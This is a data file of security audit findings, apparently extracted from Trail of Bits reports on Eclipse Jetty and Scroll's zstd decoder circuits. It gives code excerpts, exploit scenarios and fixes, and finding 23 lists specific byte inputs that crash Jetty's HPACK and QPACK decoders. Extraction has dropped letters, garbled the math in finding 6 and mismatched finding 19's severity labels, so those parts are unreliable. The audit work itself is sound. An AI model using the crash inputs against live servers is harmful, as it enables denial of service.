if (headerParser.getContentLength() == 0 ) { padding = headerParser.getPaddingLength(); state = State.PADDING; if (contentParser.noContent()) return true ; } else { ContentParser.Result result = contentParser.parse(buffer); // ...[snip]... } break ; } Figure 15.1: Parser.java , lines 82114 Exploit Scenario An attacker operates a malicious web server that supports FastCGI. A Jetty application communicates with this server by using Jettys built-in FastCGI client. The remote server transmits a frame with an invalid frame type, causing a NullPointerException exception and a crash in the Jetty application. Recommendations Short term, add a null check to the parse function to abort the parsing process before dereferencing a null return value from findContentParser . If a null value is detected, 61 OSTIF Eclipse: Jetty Security Assessment parse should throw an appropriate exception, such as IllegalStateException , that Jetty can catch and handle safely. Long term, build out a larger suite of test cases that ensures graceful handling of malformed trac and data. 62 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "16. Documentation does not specify that request contents and other user data can be exposed in debug logs ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "Over 100 times, the system calls LOG.debug with a parameter of the format BufferUtil.toDetailString(buffer) , which outputs up to 56 bytes of the buer into the log le. Jettys implementations of various protocols and encodings, including GZIP, WebSocket, multipart encoding, and HTTP/2, output user data received over the network to the debug log using this type of call. An example instance from Jettys WebSocket implementation appears in gure 16.1. public Frame.Parsed parse (ByteBuffer buffer) throws WebSocketException { try { // parse through while (buffer.hasRemaining()) { if (LOG.isDebugEnabled()) LOG.debug( \"{} Parsing {}\" , this , BufferUtil.toDetailString(buffer)); // ...[snip]... } // ...[snip]... } // ...[snip]... } Figure 16.1: Parser.java , lines 8896 Although the Jetty 12 Operations Guide does state that Jetty debugging logs can quickly consume massive amounts of disk space, it does not advise system administrators that the logs can contain sensitive user data, such as personally identiable information. Thus, the possibility of raw trac being captured from debug logs is undocumented. Exploit Scenario A Jetty system administrator turns on debug logging in a production environment. During the normal course of operation, a user sends trac containing sensitive information, such as personally identiable information or nancial data, and this data is recorded to the 63 OSTIF Eclipse: Jetty Security Assessment debug log. An attacker who gains access to this log can then read the user data, compromising data condentiality and the users privacy rights. Recommendations Short term, update the Jetty Operations Guide to state that in addition to being extremely large, debug logs can contain sensitive user data and should be treated as sensitive. Long term, consider moving all debugging messages that contain buer excerpts into a high-detail debug log that is enabled only for debug builds of the application. 64 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "17. HttpStreamOverFCGI internally marks all requests as plaintext HTTP ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "The HttpStreamOverFCGI class processes FastCGI messages in a format that can be processed by other system components that use the HttpStream interface. This classs onHeaders callback mistakenly marks each MetaData.Request object as a plaintext HTTP request, as the TODO comment shown in gure 17.1 indicates: public void onHeaders () { String pathQuery = URIUtil.addPathQuery(_path, _query); // TODO https? MetaData.Request request = new MetaData.Request(_method, HttpScheme.HTTP.asString(), hostPort, pathQuery, HttpVersion.fromString(_version), _headers, Long.MIN_VALUE); // ...[snip]... } Figure 17.1: HttpStreamOverFCGI.java , lines 108119 In some congurations, other Jetty components could misinterpret a message received over FCGI as a plaintext HTTP message, which could cause a request to be incorrectly rejected, redirected in an innite loop, or forwarded to another system over a plaintext HTTP channel instead of HTTPS. Exploit Scenario A Jetty instance runs an FCGI server and uses the HttpStream interface to process messages. The MetaData.Request classs getURI method is used to check the incoming requests URI. This method mistakenly returns a plaintext HTTP URL due to the bug in HttpStreamOverFCGI.java . One of the following takes place during the processing of this request:   An application-level security control checks the incoming requests URI to ensure it was received over a TLS-encrypted channel. Since this check fails, the application rejects the request and refuses to process it, causing a denial of service. An application-level security control checks the incoming requests URI to ensure it was received over a TLS-encrypted channel. Since this check fails, the application 65 OSTIF Eclipse: Jetty Security Assessment attempts to redirect the user to a suitable HTTPS URL. The check fails on this redirected request as well, causing an innite redirect loop and a denial of service.  An application processing FCGI messages acts as a proxy, forwarding certain requests to a third HTTP server. It uses MetaData.Request.getURI to check the requests original URI and mistakenly sends a request over plaintext HTTP. Recommendations Short term, correct the bug in HttpStreamOverFCGI.java to generate the correct URI for the incoming request. Long term, consider streamlining the HTTP implementation to minimize the need for dierent classes to generate URIs from request data. 66 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "18. Excessively permissive and non-standards-compliant error handling in HTTP/2 implementation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "Jettys HTTP/2 implementation violates RFC 9113 in that it fails to terminate a connection with an appropriate error code when the remote peer sends a frame with one of the following protocol violations:    A SETTINGS frame with the ACK ag set and a nonzero payload length A PUSH_PROMISE frame in a stream with push disabled A GOAWAY frame with its stream ID not set to zero None of these situations creates an exploitable vulnerability. However, noncompliant protocol implementations can create compatibility problems and could cause vulnerabilities when deployed in combination with other miscongured systems. Exploit Scenario A Jetty instance connects to an HTTP/2 server, or serves a connection from an HTTP/2 client, and the remote peer sends trac that should cause Jetty to terminate the connection. Instead, Jetty keeps the connection alive, in violation of RFC 9113. If the remote peer is programmed to handle the noncompliant trac dierently than Jetty, further problems could result, as the two implementations interpret protocol messages dierently. Recommendations Short term, update the HTTP/2 implementation to check for the following error conditions and terminate the connection with an error code that complies with RFC 9113:   A peer receives a SETTINGS frame with the ACK ag set and a payload length greater than zero. A client receives a PUSH_PROMISE frame after having sent, and received an acknowledgement for, a SETTINGS frame with SETTINGS_ENABLE_PUSH equal to zero. 67 OSTIF Eclipse: Jetty Security Assessment  A peer receives a GOAWAY frame with the stream identier eld not set to zero. Long term, audit Jettys implementation of HTTP/2 and other protocols to ensure that Jetty handles errors in a standards-compliant manner and terminates connections as required by the applicable specications. 68 OSTIF Eclipse: Jetty Security Assessment 19. XML external entities and entity expansion in Maven package metadata parser Severity: High Diculty: High Type: Data Validation Finding ID: TOB-JETTY-19 Target: org.eclipse.jetty.start.fileinits.MavenMetadata", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "20. Use of deprecated AccessController class ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "The classes listed in the Target cell above use the java.security.AccessController class, which is a deprecated class slated to be removed in a future Java release. The java.security library documentation states that the AccessController class is only useful in conjunction with the Security Manager, which is also deprecated. Thus, the use of AccessController no longer serves any benecial purpose. The use of this deprecated class could impact Jettys compatibility with future releases of the Java SDK. Recommendations Short term, remove all uses of the AccessController class. Long term, audit the Jetty codebase for the use of classes in the java.security package that may not provide any value in Jetty 12, and remove all references to those classes. 70 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "21. QUIC server writes SSL private key to temporary plaintext le ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "Jettys QUIC implementation uses quiche, a QUIC and HTTP/3 library maintained by Cloudare. When the servers SSL certicate is handed o to quiche, the private key is extracted from the existing keystore and written to a temporary plaintext PEM le: protected void doStart () throws Exception { // ...[snip]... char [] keyStorePassword = sslContextFactory.getKeyStorePassword().toCharArray(); String keyManagerPassword = sslContextFactory.getKeyManagerPassword(); SSLKeyPair keyPair = new SSLKeyPair( sslContextFactory.getKeyStoreResource().getPath(), sslContextFactory.getKeyStoreType(), keyStorePassword, alias, keyManagerPassword == null ? keyStorePassword : keyManagerPassword.toCharArray() ); File[] pemFiles = keyPair.export( new File(System.getProperty( \"java.io.tmpdir\" ))); privateKeyFile = pemFiles[ 0 ]; certificateChainFile = pemFiles[ 1 ]; } Figure 21.1: QuicServerConnector.java , lines 154179 Storing the private key in this manner exposes it to increased risk of theft. Although the QuicServerConnector class deletes the private key le upon stopping the server, this deleted le may not be immediately removed from the physical storage medium, exposing the le to potential theft by attackers who can access the raw bytes on the disk. A review of quiche suggests that the librarys API may not support reading a DES-encrypted keyle. If that is true, then remediating this issue would require updates to the underlying quiche library. 71 OSTIF Eclipse: Jetty Security Assessment Exploit Scenario An attacker gains read access to a Jetty HTTP/3 servers temporary directory while the server is running. The attacker can retrieve the temporary keyle and read the private key without needing to obtain or guess the encryption key for the original keystore. With this private key in hand, the attacker decrypts and tampers with all TLS communications that use the associated certicate. Recommendations Short term, investigate the quiche librarys API to determine whether it can readily support password-encrypted private keyles. If so, update Jetty to save the private key in a temporary password-protected le and to forward that password to quiche. Alternatively, if password-encrypted private keyles can be supported, have Jetty pass the unencrypted private key directly to quiche as a function argument. Either option would obviate the need to store the key in a plaintext le on the servers lesystem. If quiche does not support either of these changes, open an issue or pull request for quiche to implement a x for this issue. 72 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "22. Repeated code between HPACK and QPACK ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "Classes for dealing with n-bit integers and Human coding are implemented both in the jetty-http2-hpack and in jetty-http3-qpack libraries. These classes have very similar functionality but are implemented in two dierent places, sometimes with identical code and other times with dierent implementations. In some cases ( TOB-JETTY-9 ), one implementation has a bug that the other implementation does not have. The codebase would be easier to maintain and keep secure if the implementations were merged. Exploit Scenario A vulnerability is found in the Human encoding implementation, which has identical code in HPACK and QPACK. The vulnerability is xed in one implementation but not the other, leaving one of the implementations vulnerable. Recommendations Short term, merge the two implementations of n-bit integers and Human coding classes. Long term, audit the Jetty codebase for other classes with very similar functionality. 73 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "23. Various exceptions in HpackDecoder.decode and QpackDecoder.decode ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "The HpackDecoder and QpackDecoder classes both throw unexpected Java-level exceptions:  HpackDecoder.decode(0x03) throws BufferUnderflowException .  HpackDecoder.decode(0x4800) throws NumberFormatException .  HpackDecoder.decode(0x3fff 2e) throws IllegalArgumentException .  HpackDecoder.decode(0x3fff 81ff ff2e) throws NullPointerException .  HpackDecoder.decode(0xffff ffff f8ff ffff ffff ffff ffff ffff ffff ffff ffff ffff 0202 0000) throws ArrayIndexOutOfBoundsException .  QpackDecoder.decode(..., 0x81, ...) throws IndexOutOfBoundsException .  QpackDecoder.decode(..., 0xfff8 ffff f75b, ...) throws ArithmeticException . For both HPACK and QPACK, these exceptions appear to be caught higher up in the call chain by catch (Throwable x) statements every time the decode functions are called. However, catching them within decode and throwing a Jetty-level exception within the catch statement would result in cleaner, more robust code. Exploit Scenario Jetty developers refactor the codebase, moving function calls around and introducing a new point in the code where HpackDecoder.decode is called. Assuming that decode will throw only org.jetty errors, they forget to wrap this call in a catch (Throwable x) statement. This results in a DoS vulnerability. Recommendations Short term, document in the code that Java-level exceptions can be thrown. Long term, modify the decode functions so that they throw only Jetty-level exceptions. 74 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "24. Incorrect QPACK encoding when multi-byte characters are used ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "Javas string.length() function returns the number of characters in a string, which can be dierent from the number of bytes returned by the string.getBytes() function. However, QPACK encoding methods assume that they return the same number, which could cause incorrect encodings. In EncodableEntry.LiteralEntry , which is used to encode HTTP/3 header elds, the following method is used for encoding: public void encode (ByteBuffer buffer, int base) 214 215 { 216 byte allowIntermediary = 0x00 ; // TODO: this is 0x10 bit, when should this be set? 217 218 219 220 221 222 223 224 String name = getName(); String value = getValue(); // Encode the prefix code and the name. if (_huffman) { buffer.put(( byte )( 0x28 | allowIntermediary)); NBitIntegerEncoder.encode(buffer, 3 , HuffmanEncoder.octetsNeeded(name)); 225 226 227 HuffmanEncoder.encode(buffer, name); buffer.put(( byte ) 0x80 ); NBitIntegerEncoder.encode(buffer, 7 , HuffmanEncoder.octetsNeeded(value)); 228 229 230 231 232 HuffmanEncoder.encode(buffer, value); } else { // TODO: What charset should we be using? (this applies to the instruction generators as well). 233 234 235 236 237 238 buffer.put(( byte )( 0x20 | allowIntermediary)); NBitIntegerEncoder.encode(buffer, 3 , name.length()); buffer.put(name.getBytes()); buffer.put(( byte ) 0x00 ); NBitIntegerEncoder.encode(buffer, 7 , value.length()); buffer.put(value.getBytes()); 75 OSTIF Eclipse: Jetty Security Assessment 239 240 } } Figure 24.1: EncodableEntry.java , lines 214240 Note in particular lines 232238, which are used to encode literal (non-Human-coded) names and values. The value returned by name.length() is added to the bytestring, followed by the value returned by name.getBytes() . Then, the value returned by value.length() is added to the bytestring, followed by the value returned by value.getBytes() . When this bytestring is decoded, the decoder will read the name length eld and then read that many bytes as the name. If multibyte characters were used in the name eld, the decoder will read too few bytes. The rest of the bytestring will also be decoded incorrectly, since the decoder will continue reading at the wrong point in the bytestring. The same issue occurs if multibyte characters were used in the value eld. The same issue appears in EncodableEntry.ReferencedNameEntry.encode : if (_huffman) 164 // Encode the value. 165 String value = getValue(); 166 167 { 168 169 170 171 } 172 173 { 174 175 176 177 } else buffer.put(( byte ) 0x80 ); NBitIntegerEncoder.encode(buffer, 7 , HuffmanEncoder.octetsNeeded(value)); HuffmanEncoder.encode(buffer, value); buffer.put(( byte ) 0x00 ); NBitIntegerEncoder.encode(buffer, 7 , value.length()); buffer.put(value.getBytes()); Figure 24.2: EncodableEntry.java , lines 164177 If value has multibyte characters, it will be incorrectly encoded in lines 174176. Jettys HTTP/3 code is still considered experimental, so this issue should not aect production code, but it should be xed before announcing HTTP/3 support to be production-ready. Exploit Scenario A Jetty server attempts to add the Set-Cookie header, setting a cookie value to a UTF-8-encoded string that contains multibyte characters. This causes an incorrect cookie value to be set and the rest of the headers in this message to be parsed incorrectly. 76 OSTIF Eclipse: Jetty Security Assessment Recommendations Short term, have the encode function in both EncodableEntry.LiteralEntry and EncodableEntry.ReferencedNameEntry encode the length of the string using string.getBytes() rather than string.length() . 77 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "25. No limits on maximum capacity in QPACK decoder ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf", "body": "In QPACK, an encoder can set the dynamic table capacity of the decoder using a Set Dynamic Table Capacity instruction. The HTTP/3 specication requires that the capacity be no larger than the SETTINGS_QPACK_MAX_TABLE_CAPACITY limit chosen by the decoder. However, nowhere in the QPACK code is this limit checked for. This means that the encoder can choose whatever capacity it wants (up to Javas maximum integer value), allowing it to take up large amounts of space on the decoders memory. Jettys HTTP/3 code is still considered experimental, so this issue should not aect production code, but it should be xed before announcing HTTP/3 support to be production-ready. Exploit Scenario A Jetty server supporting QPACK is running. An attacker opens a connection to the server. He sends a Set Dynamic Table Capacity instruction, setting the dynamic table capacity to Javas maximum integer value, 2 31-1 (2.1 GB). He then repeatedly enters very large values into the servers dynamic table using an Insert with Literal Name instruction until the full 2.1 GB capacity is taken up. The attacker repeats this using multiple connections until the server runs out of memory and crashes. Recommendations Short term, enforce the SETTINGS_QPACK_MAX_TABLE_CAPACITY limit on the capacity. Long term, audit Jettys implementation of QPACK and other protocols to ensure that Jetty enforces limits as required by the standards. 78 OSTIF Eclipse: Jetty Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "1. Multiple missing Boolean constraints on Boolean advice columns ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf", "body": "The zstd decoder tables require the use of many Boolean type values, being either 0 or 1. Other values, such as 2 or -1, would cause many of the formulas used for Boolean logic to catastrophically fail, leading to potential constraint compromise. Below, we detail a non-exhaustive list of Boolean advice columns that appear to be unconstrained.  FseTable::is_new_symbol  FseTable::is_skipped_state  FseSortedStatesTable::is_new_symbol  FseSortedStatesTable::is_skipped_state  FseDecoder::is_repeat_bits_loop  FseDecoder::is_trailing_bits  BitstreamDecoder::is_nb0  BitstreamDecoder::is_nil  BlockConfig::compression_modes  TagConfig::is_reverse Exploit Scenario An attacker leverages the soundness issues of an unconstrained Boolean to disable other constraints that are derived from the unconstrained Boolean. This would allow an attacker to generate a valid proof with an invalid witness, compromising the correctness of the zstd decoder circuit. Recommendations Short term, perform the correct Boolean constraints on the necessary columns. Long term, consider annotating the Boolean columns with a wrapper type that checks if the constraint function has been called. Consider a set of checks that will ensure that all BooleanAdvice columns have been constrained. Perhaps an automated way to do this is a custom Drop implementation that will panic, alerting developers during testing. An alternative is to restrict access to the underlying column until the constraint has been added. struct BooleanAdvice { col: Column <Advice>, constrained: bool , } impl BooleanAdvice { fn column (& self ) -> & Column <Advice> { if self .constrained { & self .col } else { panic! ( \"unconstrained boolean advice\" ) } } } Figure 1.1: An example Boolean advice wrapper and protected access", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "2. Column annotations do not match lookup table columns ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf", "body": "The column annotations for the SeqInstTable , RlpFsmDataTable , and LiteralsHeaderTable tables do not match the tables columns:    In the SeqInstTable the n_seq and block_index annotations are out of order; In the LiteralsHeaderTable , there is an additional annotation ( byte_offset ) that would cause all subsequent annotations to refer to the wrong column; The RlpFsmDataTable has an unannotated column ( gas_cost_acc ). fn columns (& self ) -> Vec <Column<Any>> { vec! [ self .q_enabled.into(), self .block_index.into() , self .n_seq.into() , self .s_beginning.column.into(), self .seq_index.into(), self .literal_len.into(), self .match_offset.into(), self .match_len.into(), ] } fn annotations (& self ) -> Vec < String > { vec! [ String ::from( \"q_enabled\" ), String ::from( \"n_seq\" ) , String ::from( \"block_index\" ) , Figure 2.1: aggregator/src/aggregation/decoder/tables/seqinst_table.rs#L130L147 fn columns (& self ) -> Vec <Column<Any>> { vec! [ self .block_idx.into(), self .byte0.into(), self .byte1.into(), self .byte2.into(), self .size_format_bit0.into(), self .size_format_bit1.into(), self .regen_size.into(), self .is_padding.column.into(), ] } fn annotations (& self ) -> Vec < String > { vec! [ String ::from( \"block_idx\" ), String ::from( \"byte_offset\" ), String ::from( \"byte0\" ), String ::from( \"byte1\" ), String ::from( \"byte2\" ), String ::from( \"size_format_bit0\" ), String ::from( \"size_format_bit1\" ), String ::from( \"regen_size\" ), String ::from( \"is_padding\" ), ] } Figure 2.2: aggregator/src/aggregation/decoder/tables/literals_header.rs#L274L301 impl <F: Field > LookupTable<F> for RlpFsmDataTable { fn columns (& self ) -> Vec <Column<Any>> { vec! [ self .tx_id.into(), self .format.into(), self .byte_idx.into(), self .byte_rev_idx.into(), self .byte_value.into(), self .bytes_rlc.into(), self .gas_cost_acc.into(), ] } fn annotations (& self ) -> Vec < String > { vec! [ String ::from( \"tx_id\" ), String ::from( \"format\" ), String ::from( \"byte_idx\" ), String ::from( \"byte_rev_idx\" ), String ::from( \"byte_value\" ), String ::from( \"bytes_rlc\" ), ] } } Figure 2.3: zkevm-circuits/src/rlp_circuit_fsm.rs#L61L84 Recommendations Short term, x the reported column annotations. Long term, add debug assertions or tests that ensure that the number of columns and annotations is the same for a lookup table. Consider using zip_eq instead of zip in the LookupTable::{annotate_columns, annotate_columns_in_region} functions: /// Annotates a lookup table by passing annotations for each of it's /// columns. fn annotate_columns (& self , cs: & mut ConstraintSystem<F>) { self .columns() .iter() .zip( self .annotations().iter()) .for_each(|(&col, ann)| cs.annotate_lookup_any_column(col, || ann)) } /// Annotates columns of a table embedded within a circuit region. fn annotate_columns_in_region (& self , region: & mut Region<F>) { self .columns() .iter() .zip( self .annotations().iter()) .for_each(|(&col, ann)| region.name_column(|| ann, col)) } Figure 2.4: zkevm-circuits/src/table.rs#87102 Alternatively, consider adding a derive macro for LookupTable . This way, columns made available for lookup can easily be annotated via derive macro helper attributes . The gure below shows an example: #[derive(Clone, Debug, LookupTable)] pub struct SeqInstTable <F: Field > { #[lookup] q_enabled: Column <Fixed>, #[lookup] block_index: Column <Advice>, #[lookup] n_seq: Column <Advice>, #[lookup] seq_index: Column <Advice>, #[lookup] s_beginning: Column <Advice>, // ... offset: Column <Advice>, acc_literal_len: Column <Advice>, // ... } Figure 2.5: A derive macro-based lookup and annotation system", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "3. Unexpected BlockType for LiteralsHeader reaches unreachable! macro ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf", "body": "The witness assignment code uses an unreachable! macro if an unexpected BlockType is found while parsing the header bytes. If handpicked values are chosen in byte0 , this will lead to a runtime panic during witness generation/assignment. let lh_bytes = [ byte0 as u8 , byte1 as u8 , byte2 as u8 ]; let literals_block_type = BlockType::from( lh_bytes[ 0 ] & 0x3 ); let size_format = (lh_bytes[ 0 ] >> 2 ) & 3 ; let [n_bits_fmt, n_bits_regen, n_bytes_header]: [ usize ; 3 ] = match literals_block_type { BlockType::RawBlock => match size_format { 0b00 | 0b10 => [ 1 , 5 , 1 ], 0b01 => [ 2 , 12 , 2 ], 0b11 => [ 2 , 20 , 3 ], _ => unreachable! ( \"size_format out of bound\" ), }, _ => unreachable! ( \"BlockType::* unexpected. Must be raw bytes for literals.\" ), }; Figure 3.1: aggregator/src/aggregation/decoder/tables/literals_header.rs#206221 Exploit Scenario The prover is passed a malformed compressed blob with an unexpected block type, causing the prover to halt. Recommendations Short term, return an Error instead of calling the unreachable! macro. Long term, investigate all calls to the unreachable! macro used during witness assignment.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "4. RomTagTransition table does not allow ZstdBlockSequenceHeader -> BlockHeader transitions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf", "body": "The RomTagTransition table does not allow transitioning from ZstdBlockSequenceHeader to BlockHeader . This causes a completeness issue where honestly generated compressed data does not satisfy the tag transition circuit. Figure 4.1 shows the allowed transitions and highlights the transitions that reach BlockHeader  none originate from ZstdBlockSequenceHeader : [ ] (FrameHeaderDescriptor, FrameContentSize), (FrameContentSize, BlockHeader ), (BlockHeader, ZstdBlockLiteralsHeader), (ZstdBlockLiteralsHeader, ZstdBlockLiteralsRawBytes), (ZstdBlockLiteralsRawBytes, ZstdBlockSequenceHeader), (ZstdBlockSequenceHeader, ZstdBlockSequenceFseCode), (ZstdBlockSequenceHeader, ZstdBlockSequenceData), (ZstdBlockSequenceFseCode, ZstdBlockSequenceFseCode), (ZstdBlockSequenceFseCode, ZstdBlockSequenceData), (ZstdBlockSequenceData, BlockHeader ), // multi-block (ZstdBlockSequenceData, Null), (Null, Null), Figure 4.1: aggregator/src/aggregation/decoder/tables/fixed/tag_transition.rs#L28L4 1 However, in the specication, the ZstdBlockSequenceHeader to BlockHeader transition is described and has associated constraints: Figure 4.2: Circuit specication where a ZstdBlockSequenceHeader to BlockHeader transition is mentioned Figure 4.3 shows the implementation of the constraint from gure 4.2: cb.condition(is_prev_sequence_header(meta), |cb| { cb.require_equal( \"tag::prev=SeqHeader\" , config .block_config .is_empty_sequences(meta, Rotation::prev()), 1. expr(), ); }); Figure 4.3: aggregator/src/aggregation/decoder.rs#18071815 Exploit Scenario A two-block encoded data, where the rst block contains no sequences to decode, is honestly generated by the zstd compression algorithm. However, due to the missing transition, this compressed data does not satisfy the decoder circuit. Recommendations Short term, allow for the ZstdBlockSequenceHeader to BlockHeader transition to occur in the tag transition circuit, or document why this is not allowed. Long term, add tests with zstd compressed data that exercise all possible valid tag transitions.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "5. The back referencing phase is not properly constrained to a monotone behavior once activated ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf", "body": "The column s_back_ref_phase is not properly constrained to ensure the back-referencing phase is monotone once activated. The issue is likely due to a typo. Executing decoding sequences happens in phases: Literal copy and back-references. The two phases must not occur simultaneously. Furthermore, each phase must have a monotone behaviori.e., the literal copy phase (the back-referencing phase, respectively) remains deactivated (activated, respectively). The constraint in gure 6.1 is meant to ensure the monotonicity of the back referencing phase once activated. However, likely due to a typo, s_back_ref_phase_prev is constrained to be equal to 1 instead of s_back_ref_phase . cb.condition( and::expr([ not::expr(is_inst_begin.expr()), s_back_ref_phase_prev.expr(), ]), |cb| { cb.require_equal( \"inside a inst, backref phase keep 1 once it changed to 1\" , s_back_ref_phase_prev.expr(), 1. expr(), ); }, ); Figure 5.1: aggregator/src/aggregation/decoder/seq_exec.rs#L393L405 However, other constraints enforce that either a phase is activated or the current rows correspond to padding. But exploiting this issue appears dicult due to adjacent constraints. The monotonicity of the literal copy phase once deactivated is guaranteed by appropriate constraints. Therefore, to use arbitrary values in the column s_back_ref_phase , a malicious prover must produce a copy command that is compatible with the copied value. On the other hand, when no phase is activated, the current rows correspond to padding rows. An attacker could potentially abuse the ineective constraints to provide a shorter witness. It is unclear whether this approach is feasible and what impact such an attack may ultimately have on the overall system. Exploit Scenario An attacker notices the defective constraints and produces a false witness by exploiting the missing constraints for monotonicity on s_back_ref_phase . We could not fully determine the feasibility of producing malicious witnesses or whether monotonicity is fully guaranteed by adjacent constraints. Recommendations Short term, amend the code so that it constrains s_back_ref_phase to be equal to 1 instead of s_back_ref_phase_prev . cb.condition( and::expr([ not::expr(is_inst_begin.expr()), s_back_ref_phase_prev.expr(), ]), |cb| { cb.require_equal( \"inside a inst, backref phase keep 1 once it changed to 1\" , s_back_ref_phase.expr(), 1. expr(), ); }, ); Figure 5.2: An example x of the aforementioned issue Long term, review the codebase for potential variable typos and patterns that could render constraints void. Some examples of patterns to investigate include: comparing a variable with itself, subtracting a variable from itself, or naming conventions such as: (variable_name, variable_name_prev) .", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Low"]}, {"title": "6. The blob-based public input commitment scheme is poorly documented ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf", "body": "To reduce the gas cost of verication, the Scroll team has moved some of the ZkEVMs public input data into the EIP-4844 blob structure, whereby the underlying data is stored only temporarily, at a lower gas cost. The verier contract has access only to a polynomial commitment to the blob data and evaluation proofs. Additionally, with the addition of the zstd circuits reviewed in this report, the data in the blob is instead in zstd-compressed form. When the ZkEVM verier is deployed in the Scroll rollup contract, a batch, consisting of both L1 and L2 transactions and associated metadata, is committed in the rollup contract. Committed batches can then either be reverted or nalized. To nalize a batch, a ZkEVM proof is checked against the metadata provided in the commit stage, and if the proof succeeds, the batch is nalized and can no longer be reverted. Since the ZkEVM prover should be untrusted in the system, the metadata in the commit stage must uniquely identify the transactions in the underlying batch; otherwise, the prover may be able to nalize a dierent sequence of transactions than was intended. Prior to EIP-4844 integration, the sequence of transactions in a chunk was fully determined by the public input hash of the ZkEVM circuit, which would then be combined together into an overall public input hash by the aggregation circuit. In this scheme, the unique identication is a straightforward consequence of the collision resistance of the hash used. However, the current scheme is more complex. The transactions are now split between this public input hash and the blob structure. The PI subcircuit of the ZkEVM splits the underlying sequence of transactions into L1 and L2 transactions. The L1 transactions are included in the public input hash, and the L2 transactions are included in the chunk tx hash. Unless there is some as-yet-unknown aw in the PI subcircuit, this guarantees the uniqueness of the L1 transactions as before. To commit to the L2 transactions, the overall public inputs of the aggregation circuit include a tuple (versionedHash,z,y) , representing the polynomial commitment to the blob and the evaluation that must be checked by the verier. To conclude that this uniquely identies a particular sequence of L2 transactions, we must determine that: is a unique polynomial corresponding to versionedHash ; is a unique polynomial corresponding to the L2 transaction 1. 2. 3.  (  )  (  ) , where , where  (  ) =   (  ) =  sequence;  both the L2 transaction sequence and versionedHash . is a pseudorandom challenge derived from a transcript including commitments to These three requirements suce because blobs represent degree-4096 polynomials over a 254-bit nite eld. The chance that point purpose of checking that for a randomly sampled as randomly sampled for the is negligible, and requirement (3) allows us to treat by the Fiat-Shamir heuristic.  (  )   (  )  (  ) =  (  )  (  ) =  (  ) and   Requirement (1) is ensured because the verier contract checks a point evaluation proof, and versionedHash is a hash of a KZG commitment, which uniquely determines  (  ) .  (  ) is more complicated, since the underlying The evaluation in requirement (2) is checked by the BarycentricEvaluationConfig circuit. However, the uniqueness of transaction data is not stored in the blob. Instead, the BatchDataConfig subcircuit of the aggregation circuit includes the whole L2 transaction sequence data as private witness values. The aggregation circuit checks those hashes against the chunk tx hash public inputs of the ZkEVM proofs being aggregated, and checks that the L2 transaction sequence is the result of zstd-decompressing the data used in the BarycentricEvaluationConfig circuit. To then establish that circuit is deterministic; and (b) that the serialization of the L2 transactions when computing the chunk tx hash is unique. is unique, we must assume (a) that the zstd decompression  (  ) Finally, requirement (3) is ensured by checking that the challenge can be computed as a hash of data that includes the versionedHash and the chunk tx hashes, via an internal lookup in the BatchDataConfig table, shown below in gure 6.1. // lookup challenge digest in keccak table. meta.lookup_any( \"BatchDataConfig (metadata/chunk_data/challenge digests in keccak table)\" , |meta| { let is_hash = meta.query_selector(config.hash_selector); let is_boundary = meta.query_advice(config.is_boundary, Rotation::cur()); // when is_boundary is set in the \"digest RLC\" section. // this is also the last row of the \"digest RLC\" section. let cond = is_hash * is_boundary; // - metadata_digest: 32 bytes // - chunk[i].chunk_data_digest: 32 bytes each // - versioned_hash: 32 bytes let preimage_len = 32. expr() * (N_SNARKS + 1 + 1 ).expr(); [ 1. expr(), 1. expr(), meta.query_advice(config.preimage_rlc, Rotation::cur()), // input rlc // input len preimage_len, // output rlc meta.query_advice(config.digest_rlc, Rotation::cur()), // 